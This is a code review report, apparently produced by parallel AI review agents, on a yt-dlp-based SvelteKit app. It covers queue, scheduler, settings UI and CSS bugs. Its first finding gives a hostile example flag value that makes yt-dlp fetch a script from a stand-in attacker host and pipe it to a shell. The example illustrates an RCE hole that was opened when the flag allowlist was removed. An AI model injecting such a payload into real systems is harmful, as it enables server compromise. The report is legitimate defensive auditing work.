# Code Review Report
**Review Date:** 2026-09-10
**Scope:** All staged changes in git working tree
**Method:** Multi-agent parallel review (23 agents, 19 territory + support)
**Build Status:** ✅ Pass (npm build: exit 0, vitest: 31/31 files, 250/250 tests pass)

---

## Executive Summary

**Critical Issues Found: 7**
- Yt-dlp flag validation completely disabled (RCE vulnerability)
- Download/subscription job queue has critical failure modes
- Settings UI has multiple null-safety and render-state issues
- Settings layout CSS has breaking containment rules
- Settings tab navigation uses buttons instead of anchors
- Modals misplaced in wrong route pages

**Suggestion Issues Found: 11**
- Unused imports throughout settings pages
- Job queue never prunes terminal rows
- Dead code (suppressSpy, scroll-spy remnants)
- Test coverage gaps for new queue system
- Settings CSS breaks modal positioning

**Nice-to-have Issues Found: 2**
- Package.json has orphaned node-cron dependency
- 409 error message type-specific wording mismatch

---

## Critical Findings

### 1. Yt-dlp Flag Validation Disabled (RCE Vulnerability)

**Location:** Multiple files
- `src/lib/server/services/ytdlp.service.ts:7`
- `src/lib/server/services/download.service.ts:160`
- `src/lib/server/services/settings-validation.ts:400`
- `src/lib/server/services/youtube-link.service.test.ts:101`

**Issue:** The yt-dlp flag whitelist check was completely removed and replaced with a stub that always returns `null`. User-supplied flags (including `--exec`) now reach yt-dlp unvalidated, enabling arbitrary command execution.

**Failure Scenario:**
1. User saves yt-dlp settings with `extraFlags: ['--exec', 'curl http://evil.com/pwn | sh']`
2. On next download, yt-dlp receives the flag and executes the command as the server user
3. Attack vector can also be triggered via profile custom flags or import routes

**Suggested Fix:**
1. Restore real allowlist implementation in `findDangerousFlag`
2. Re-add validation guards in `download.service.ts:160`, `settings-validation.ts:400`, and API routes
3. Re-add deleted test `'filters non-whitelisted flags from extraFlags'`

**Fix Constraint:** The test requires `['--sleep-requests', '1']` to pass; the restored filter must keep this.

**Severity:** Critical  
**Confidence:** High

---

### 2. Subscription Job Rescheduling Kill-Switch

**Location:** `src/lib/server/jobs/scheduler.ts:75`

**Issue:** Failed recurring jobs are not rescheduled because `scheduleNextRun` is only called on success.

**Failure Scenario:** 
- YouTube sync job fails on transient network error → job marked FAILED → `scheduleNextRun` never called → youtube-sync never runs again until restart
- Same applies to: cache-cleanup, auto-delete, backup, ytdlp-update, watched-cleanup, monitor-check

**Suggested Fix:**
```ts
queueService.registerHandler('system', async (job) => {
	const payload = job.payload as any;
	if (!payload?.name) return;
	try {
		await this.runJob(payload.name);
	} finally {
		await this.scheduleNextRun(payload.name);
	}
});
```

**Fix Constraint:** `scheduleNextRun` dedupes by name; the finally must preserve this behavior.

**Severity:** Critical  
**Confidence:** High

---

### 3. Livestream Monitoring Never Started

**Location:** `src/lib/server/jobs/scheduler.ts:163`

**Issue:** The `startMonitoring()` call is commented out and the `monitor-check` job is never scheduled.

**Failure Scenario:** After any server restart, enabled YouTube livestream monitors never respawn because `yt-dlp --wait-for-video` processes die with the pod and are never restarted.

**Suggested Fix:**
```ts
await subscriptionService.startScheduler();
await monitorService.startMonitoring();
await this.scheduleNextRun('monitor-check');
```

**Severity:** Critical  
**Confidence:** High

---

### 4. Watched Cleanup Disable Broken

**Location:** `src/lib/server/jobs/scheduler.ts:305`

**Issue:** `restartCleanupTask` lost its disable path; turning off watched-cleanup in settings no longer stops it.

**Failure Scenario:** User disables cleanup → `restartCleanupTask` does nothing → registry entry stays enabled → PENDING job fires → `scheduleNextRun` re-enqueues → infinite no-op loop.

**Suggested Fix:**
```ts
} else {
	this.jobRegistry.set('watched-cleanup', {
		name: 'watched-cleanup',
		cron: this.secondsToCronInterval(settings?.cleanupIntervalSeconds || 3600),
		enabled: false,
		description: 'Clean up watched items',
	});
	await prisma.jobQueue.deleteMany({
		where: { type: 'system', status: 'PENDING', payload: { path: ['name'], equals: 'watched-cleanup' } },
	});
}
```

**Severity:** Critical  
**Confidence:** High

---

### 5. Metadata Job Concurrency Limit Bypassed

**Location:** `src/lib/server/services/queue.service.ts:104`

**Issue:** `availableMetadataSlots` is computed once before the claim loop and never decremented as jobs are claimed.

**Failure Scenario:** Queue 20+ metadata jobs → first poll returns up to 20 jobs → `availableMetadataSlots` stays `1` → each passes the check → up to 20 simultaneous `yt-dlp -J` fetches → YouTube 429 errors.

**Suggested Fix:**
```ts
if (job.type === 'download') {
	this.activeDownloads++;
	availableDownloadSlots--;
}
if (job.type === 'metadata') {
	this.activeMetadata++;
	availableMetadataSlots--;
}
```

**Fix Constraint:** Must preserve limit-1 metadata concurrency across a batch.

**Severity:** Critical  
**Confidence:** High

---

### 6. Settings Layout Render-State Cascade Removed

**Location:** `src/routes/settings/+layout.svelte:2356`

**Issue:** The deleted page's render-state cascade (null guard, loading skeleton, error state) has no replacement.

**Failure Scenario:**
1. Admin opens `/settings/app` directly → `settings === null` → `s.settings.downloadPath` throws `TypeError`
2. Non-admin visits `/settings/app` → `settings` stays null → crash on every visit
3. Non-admin visits `/settings/users` → admin shell renders with "Admin privileges" checkbox, "Clear All Downloads" button

**Suggested Fix:** Restore cascade at children render site:
```svelte
{#if activeTab === 'account' || (isAdmin && (activeTab === 'users' || settings))}
	{@render children?.()}
{:else if settingsError}
	<!-- error + Retry -->
{:else}
	<!-- skeleton -->
{/if}
```

**Severity:** Critical  
**Confidence:** High

---

### 7. Modal Mount Points Misplaced

**Location:** `src/routes/settings/users/+page.svelte:333-495`

**Issue:** Three shared modals (Password Change, ImportSubscriptionsModal, Import Config Preview) are nested inside the `{#if activeSection() === 'danger-zone'}` gate.

**Failure Scenario:**
- Click "Change Password" on `/settings/users` → modal inside danger-zone gate → nothing appears
- Click "Change Password" on `/settings/account` → users page not mounted → no modal exists
- Config import on `/settings/app` → modal exists only on users page → nothing appears

**Suggested Fix:** Move modal block into `settings/+layout.svelte` after settings container.

**Severity:** Critical  
**Confidence:** High

---

## Suggestion Findings

### 8. Job Queue Never Prunes Terminal Rows

**Location:** `prisma/schema.prisma:660-676`

**Issue:** No retention path for terminal-state (COMPLETED/FAILED) JobQueue rows.

**Failure Scenario:** Recurring system jobs insert a fresh row every tick; once marked COMPLETED they're orphaned forever. ~450 dead rows/day → ~165k/year.

**Suggested Fix:** Add prune in `QueueService.start()` or on each poll:
```ts
await prisma.jobQueue.deleteMany({ 
	where: { 
		status: { in: ['COMPLETED', 'FAILED'] }, 
		completedAt: { lt: new Date(Date.now() - 7 * 24 * 3600 * 1000) } 
	} 
});
```

**Fix Constraint:** Must filter on terminal status or completedAt, never runAt/age alone — PENDING rows are rescheduled.

**Severity:** Suggestion  
**Confidence:** High

---

### 9. Unused Imports in Settings Layout

**Location:** `src/routes/settings/+layout.svelte:8-22`

**Issue:** 15 imports are never referenced — leftovers from monolithic settings page split.

**Suggested Fix:** Delete lines 8-22 (keep used imports: settings.css, onMount, showConfirm, addToast, csrfFetch, trapFocus, page).

**Severity:** Suggestion  
**Confidence:** High

---

### 10. Settings Layout Unused Interface

**Location:** `src/routes/settings/+layout.svelte:36`

**Issue:** Declared `interface Props` is never applied — props destructured with `data: any`.

**Suggested Fix:** Add `children: import('svelte').Snippet;` to Props and destructure with `let { data, children }: Props = $props();`.

**Severity:** Suggestion  
**Confidence:** High

---

### 11. Settings Layout Active Section Default Timing Issue

**Location:** `src/routes/settings/+layout.svelte:62`

**Issue:** Effect defaults `activeSection` to app-tab section before async `loadSettings()` populates `settings`.

**Failure Scenario:** Admin opens `/settings/app` → effect sets `activeSection = 'storage'` → app page renders with `settings === null` → `null.downloadPath` throws.

**Suggested Fix:** Skip default when `tab === 'app' && !settingsLoaded`.

**Severity:** Suggestion  
**Confidence:** High

---

### 12. CreateUser Double-Counts Total

**Location:** `src/routes/settings/+layout.svelte:1191`

**Issue:** `createUser` increments `usersTotal` after `loadUsers()` already set it.

**Suggested Fix:** Delete `usersTotal += 1;` line.

**Severity:** Suggestion  
**Confidence:** High

---

### 13. saveUserQuota Missing Validation

**Location:** `src/routes/settings/+layout.svelte:1595`

**Issue:** Negative or non-finite GB values sent unvalidated; server stores `BigInt(v)` with no sign check.

**Failure Scenario:** Admin types "-5" → PATCH `cacheQuotaBytes: "-5368709120"` → negative quota → eviction loop never breaks → user's cached downloads unlinked and deleted on every completion.

**Suggested Fix:** Validate before sending:
```ts
const gb = Number(raw);
if (raw !== '' && (!Number.isFinite(gb) || gb < 0)) {
	addToast('error', 'Cache override must be zero or more GB');
	return;
}
```

**Severity:** Suggestion  
**Confidence:** High

---

### 14. Import Config ytdlpExtraFlags Mirror Not Refreshed

**Location:** `src/routes/settings/+layout.svelte:779`

**Issue:** `applyImport` replaces `settings` but never refreshes `ytdlpExtraFlagsText` mirror.

**Failure Scenario:** Admin imports config with different flags → textarea shows pre-import flags → on first keystroke, stale text overwrites imported flags.

**Suggested Fix:** After `settings = data.settings`, refresh: `ytdlpExtraFlagsText = (data.settings.ytdlpExtraFlags ?? []).join('\n');`.

**Severity:** Suggestion  
**Confidence:** High

---

### 15. SuppressSpy State and Comments Removed

**Location:** `src/routes/settings/+layout.svelte:172`

**Issue:** `suppressSpy`/`suppressSpyTimeout` declared, in `__state`, never read or written — dead state from removed scroll-spy mechanism.

**Suggested Fix:** Delete variables and related comments (lines 76, 156, 169-171).

**Severity:** Suggestion  
**Confidence:** High

---

### 16. Settings Tabs Use Buttons Instead of Anchors

**Location:** `src/routes/settings/+layout.svelte:2306-2319`

**Issue:** Settings tabs are `<button>`s with JS handlers instead of `<a>` anchors.

**Failure Scenario:** User cmd-clicks/middle-clicks "App Settings" tab → nothing happens (no new-tab behavior), no hover URL preview, no context-menu entry.

**Suggested Fix:** Render as anchors: `<a class="tab" class:active={activeTab === 'account'} href="/settings/account" onclick={() => (activeSection = 'account')}>`.

**Severity:** Suggestion  
**Confidence:** High

---

### 17. Quick Navigation Section Selection Not URL-Dependent

**Location:** `src/routes/settings/+layout.svelte:2334-2340`

**Issue:** Quick nav switches section via Svelte state only; no URL reflection.

**Failure Scenario:** User clicks "Notifications" → page reloads → shows "Storage" section (default); F5 loses place; Back button doesn't return to previous section.

**Suggested Fix:** Put section in URL: `selectSection` → `goto('?section=' + sectionId)`; `$effect` init from `$page.url.searchParams.get('section')`.

**Severity:** Suggestion  
**Confidence:** High

---

### 18. App Page Import Modal Never Renders

**Location:** `src/routes/settings/app/+page.svelte:1119-1125`

**Issue:** Config-import preview modal rendered only on users page, not app page.

**Failure Scenario:** Admin clicks "Import Config" on app page → no modal appears (modal markup only in users page).

**Suggested Fix:** Hoist `{#if s.importPreview}` modal into `settings/+layout.svelte`.

**Severity:** Suggestion  
**Confidence:** High

---

### 19. Settings CSS contain: layout Breaks Modals

**Location:** `src/routes/settings/settings.css:181-186`

**Issue:** `contain: layout` makes `.general-settings` containing block for fixed-position descendants.

**Failure Scenario:** Modal overlay measures container size (400×1200) not viewport (1280×800); overlay scrolls with page instead of covering viewport.

**Suggested Fix:** Delete `contain: layout style; isolation: isolate;` from `.general-settings`.

**Severity:** Suggestion  
**Confidence:** High

---

### 20. Settings CSS :global(svg) Invalid in Plain CSS

**Location:** `src/routes/settings/settings.css:727-729`

**Issue:** `:global()` is Svelte scoped-CSS syntax; invalid in plain `.css` file; browsers drop the rule.

**Failure Scenario:** `.btn-with-icon svg` doesn't get `flex-shrink: 0`; on mobile with `flex: 1`, icons shrink alongside text.

**Suggested Fix:** `.btn-with-icon svg { flex-shrink: 0; }`.

**Severity:** Suggestion  
**Confidence:** High

---

### 21. Settings CSS Element Selectors Leaking to Other Routes

**Location:** `src/routes/settings/settings.css:321-324`

**Issue:** Bare element/attribute selectors in route stylesheet leak globally.

**Failure Scenario:** After visiting settings, `/subscriptions`' "Check Interval" `<select>` renders with 1rem padding (not 0.5rem), 1rem font (not 14px) — navigation history affects rendering.

**Suggested Fix:** Wrap entire stylesheet under settings-only root class (e.g., `.settings-container`).

**Severity:** Suggestion  
**Confidence:** High

---

### 22. Settings CSS Breaks PasswordInput Contract

**Location:** `src/routes/settings/settings.css:321-326`

**Issue:** Element-level input overrides break PasswordInput's documented baseline contract.

**Failure Scenario:** Password field has `padding: 0.5rem 1rem; font-size: 0.875rem`; reveal toggle changes type to `'text'` → matches `input[type='text']` → jumps to `padding: 1rem; font-size: 1rem`.

**Suggested Fix:** Either drop element-level overrides or add stable padding/font-size to PasswordInput component.

**Severity:** Suggestion  
**Confidence:** High

---

## Nice-to-Have Findings

### 23. Orphaned node-cron Dependencies

**Location:** `package.json:41,61`

**Issue:** `node-cron` ^4.2.1 and `@types/node-cron` ^3.0.11 remain after full migration to `cron-parser`.

**Failure Scenario:** Every install pulls unused module; future security advisory pages maintainers over dead code.

**Suggested Fix:** `npm uninstall node-cron @types/node-cron`.

**Severity:** Nice to have  
**Confidence:** High

---

### 24. 409 Message Type-Specific Wording

**Location:** `src/routes/api/subscriptions/+server.ts:178`

**Issue:** "A subscription for this channel already exists" is misleading when importing playlists or user feeds.

**Suggested Fix:** Use type-neutral wording or vary noun on `data.type`.

**Severity:** Nice to have  
**Confidence:** High

---

## Test Coverage Gaps

### Missing Test Files
- `src/lib/server/services/queue.service.test.ts` — No test file exists; should cover:
  - Metadata job concurrency (claim loop decrement)
  - Job failure bookkeeping unhandled rejection
  - Prune for terminal rows (7-day retention)

- `src/lib/server/jobs/scheduler.test.ts` — Should cover:
  - System job failure rescheduling (try/finally)
  - Monitor-check startup call
  - Watched-cleanup disable path

### Weakened Tests
- `src/lib/server/services/youtube-link.service.test.ts` — `'filters non-whitelisted flags from extraFlags'` deleted
- `src/lib/server/services/ytdlp.service.test.ts` — `'filters non-whitelisted flags from extraFlags'` deleted
- `src/lib/server/services/settings-validation.test.ts` — Non-whitelisted flag rejection test deleted

---

## Deployment Checklist

### Production-Blockers (Must Fix Before Deploy)
- [ ] Restore yt-dlp flag validation (Critical #1)
- [ ] Fix system job rescheduling (Critical #2, #4)
- [ ] Restore livestream monitoring startup (Critical #3)
- [ ] Fix metadata concurrency limit (Critical #5)
- [ ] Restore settings render-state cascade (Critical #6)
- [ ] Fix modal placement (Critical #7)

### High-Priority (Fix Before Deploy)
- [ ] Fix settings null-safety on app tab (Critical #6 - secondary)
- [ ] Add job queue retention pruning (Suggestion #8)
- [ ] Fix createUser usersTotal double-count (Suggestion #12)
- [ ] Validate saveUserQuota (Suggestion #13)
- [ ] Fix import config ytdlpExtraFlags mirror (Suggestion #14)

### Medium-Priority (Fix in First Post-Mortem Release)
- [ ] Remove unused imports from settings layout (Suggestion #9)
- [ ] Remove unused Props interface (Suggestion #10)
- [ ] Fix activeSection default timing (Suggestion #11)
- [ ] Remove suppressSpy state (Suggestion #15)
- [ ] Convert settings tabs to anchors (Suggestion #16)
- [ ] Fix quick nav URL reflection (Suggestion #17)
- [ ] Hoist config import modal (Suggestion #18)

### Low-Priority (Fix in Next Milestone)
- [ ] Remove contain: layout from settings CSS (Suggestion #19)
- [ ] Fix :global(svg) in settings CSS (Suggestion #20)
- [ ] Scope settings CSS selectors (Suggestion #21)
- [ ] Fix PasswordInput CSS override (Suggestion #22)
- [ ] Remove orphaned node-cron deps (Nice-to-have #23)
- [ ] Fix 409 error message wording (Nice-to-have #24)

---

## Recommended Actions

1. **Immediate:** Halt deployment until all Critical issues are fixed
2. **Pre-deploy:** Add test coverage for queue.service and scheduler
3. **Post-deploy:** Create task for CSS refactoring (Suggestion #19-22)
4. **Ongoing:** Add ESLint unused-imports rule to prevent residue
5. **Ongoing:** Add `noUnusedLocals` to tsconfig.json

---

## Appendix: Test Results

```
Build: ✅ PASS
- npm run build: exit 0, 7s
- SSR: 419 modules transformed
- Client: 312 modules transformed

Tests: ✅ PASS
- 31 test files passed (31/31)
- 250 tests passed (250/250)
- Exit code: 0

Note: Playwright integration suite (`test:integration`) and `svelte-check` (`check`) were not run.
```

---

*This report was compiled from 23 parallel review agents analyzing 12,829 diff lines across 19 chunks.*
